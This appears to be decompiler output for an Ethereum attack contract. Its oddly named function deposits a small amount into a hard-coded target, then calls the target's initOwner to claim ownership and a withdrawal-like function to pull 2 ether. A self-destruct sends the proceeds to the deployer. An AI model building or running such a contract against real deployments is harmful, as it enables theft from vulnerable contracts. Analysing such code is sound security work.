contract main {


// =======================  Init code  ======================


address stor0;
address stor1;

function _fallback() payable {
    stor0 = 0xc4529ea3f838a7e27a673a87bfe844a5b8b1e4e2
    require not msg.value
    stor1 = msg.sender
    return code.data[98 len 549]
}



// =====================  Runtime code  =====================


address stor0;
address owner;

function owner() {
    return owner
}

function withdraw() {
    selfdestruct(owner)
}

function _fallback() payable {
  stop
}

function fuck() {
    require ext_code.size(stor0)
    call stor0.0xf340fa01 with:
       value 10^14 wei
         gas gas_remaining - 9710 wei
        args this.address
    require ext_call.success
    require ext_code.size(stor0)
    call stor0.initOwner(address rg1) with:
         gas gas_remaining - 710 wei
        args this.address
    require ext_call.success
    require ext_code.size(stor0)
    call stor0.0x117de2fd with:
         gas gas_remaining - 710 wei
        args address(this.address), 2 * 10^18
    require ext_call.success
}



}
